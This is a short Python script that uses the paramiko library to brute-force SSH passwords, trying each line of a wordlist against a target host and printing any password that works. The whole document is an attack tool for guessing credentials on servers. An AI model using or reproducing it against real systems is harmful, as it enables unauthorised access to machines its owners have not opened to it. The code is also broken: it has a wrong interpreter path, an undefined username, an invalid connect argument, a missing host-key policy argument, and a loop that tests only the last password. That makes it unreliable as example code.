#!/usr/share/env python3

import paramiko,os,sys


def ssh_connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy()

	try:
		ssh.connect(target=sys.argv[1] ,port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code=1

	ssh.close()
	return code


if __name__=="__main__":
	with open(sys.argv[2], 'r') as file:
		for lines in file.readlines():
			password=lines.strip()

		try:
			response = ssh_connect(password)
			if response == 0:
				print("Password found: "+password)
		except Exception as e:
			print(e)
			pass

